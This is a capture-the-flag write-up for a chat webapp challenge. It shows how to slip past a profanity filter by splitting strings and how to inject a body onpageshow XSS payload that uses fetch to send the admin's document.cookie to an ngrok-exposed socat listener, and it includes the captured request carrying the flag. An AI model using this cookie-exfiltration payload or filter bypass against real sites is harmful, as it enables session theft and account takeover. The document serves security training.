# whatsup

## What it is

It is a chat webapp, you can send messages to other users.

Some words are censored (replaced by ```*```), they will be replaced wherever they appear in the message.\
For example ```console``` will become ```***sole```.
Some of the words we found:
- con
- ass
- fuck
- shit
- bite
- merde
- cul
- hell

The max input size is 255 char (a bit less actually).

## Solution

We can put code in the ```onpageshow``` event of the body ([source](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpageshow).

example:
```html
<body onpageshow="alert('Hey')">
```

To use function/objects like ```console``` that contain censored words we can use a simple trick:
```html
<body onpageshow="globalThis['co'+'nsole'].log('Hey')">
```

We need our injected code to send us the admin's cookie when the admin loads their messages.

### Setting up the server

First we need a server with that can be reached by the admin's client, here is a simple solution

Use socat to create a tcp socket, we could use a real http server but it doesn't really matter.
```bash
$ socat TCP-LISTEN:9000,fork stdout
```

Then to make it available online we can use [ngrok](https://ngrok.com/):
```bash
$ ngrok http 900

Session Status                online                                                                                
Account                       User (Plan: Free)                                                                   
Version                       3.1.0                                                                                 
Region                        Europe (eu)                                                                           
Latency                       42ms                                                                                  
Web Interface                 http://127.0.0.1:4040                                                                 
Forwarding                    https://7097-163-5-23-68.eu.ngrok.io -> http://localhost:9000
```
Notice the ```Forwarding``` section, ```https://7097-163-5-23-68.eu.ngrok.io``` is where we'll want the admin to make requests.

### XSS command

We can use [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) to make http requests, the cookie is in ```document.cookie```.
```html
<body onpageshow="fetch('https://7097-163-5-23-68.eu.ngrok.io', {method: 'post', body: document.cookie})">
```

A first request will arrive immediately, that's the one from our client. Within a minute a second request will arrive from the admin.

Using socat it should look something like this:
```
POST / HTTP/1.1
Host: 7097-163-5-23-68.eu.ngrok.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Content-Length: 0
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Content-Type: text/plain;charset=UTF-8
Origin: https://whatsup.secu-web.blackfoot.dev
Pragma: no-cache
Referer: https://whatsup.secu-web.blackfoot.dev/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Te: trailers
X-Forwarded-For: 163.5.23.68
X-Forwarded-Proto: https

POST / HTTP/1.1
Host: 7097-163-5-23-68.eu.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/78.0.3882.0 Safari/537.36
Content-Length: 36
Accept: */*
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Origin: http://whatsup:8000
Referer: http://whatsup:8000/admin
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
X-Forwarded-For: 35.242.202.31
X-Forwarded-Proto: https

flag=BFS{XSS_M0R3_L!K3_FR33_C00K!35}
```

flag: ```BFS{XSS_M0R3_L!K3_FR33_C00K!35}```
